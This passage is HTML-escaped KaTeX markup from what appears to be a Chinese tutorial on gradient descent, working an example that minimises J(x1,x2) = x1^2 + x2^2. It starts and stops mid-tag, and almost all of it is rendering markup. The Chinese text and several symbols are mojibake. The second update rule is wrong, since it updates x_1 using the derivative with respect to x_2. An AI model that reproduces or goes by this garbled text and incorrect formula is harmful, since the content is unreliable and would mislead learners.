class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;Î¸&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚æ±‚ä¸€ä¸ªå‡½æ•°&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;J(x_1, x_2) = x_1^2 + x_2^2&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0622159999999998em;vertical-align:-0.24810799999999997em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.24810799999999997em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0622159999999998em;vertical-align:-0.24810799999999997em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.24810799999999997em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„æå°å€¼ï¼Œå³ç›®æ ‡ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;minJ(x_1,x_2)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œ&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;Î±&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;Î±&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mspace linebreak=&#34;newline&#34;&gt;&lt;/mspace&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;Î±&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;Î±&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_1 = x_1 - \alpha \frac{d}{dx_1}J(x_1,x_2)=x_1-2\alpha x_1 \\
x_1 = x_1 - \alpha \frac{d}{dx_2}J(x_1,x_2)=x_1-2\alpha x_2
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20744em;vertical-align:-0.8360000000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;Î±&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.37144em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.79444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;Î±&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord 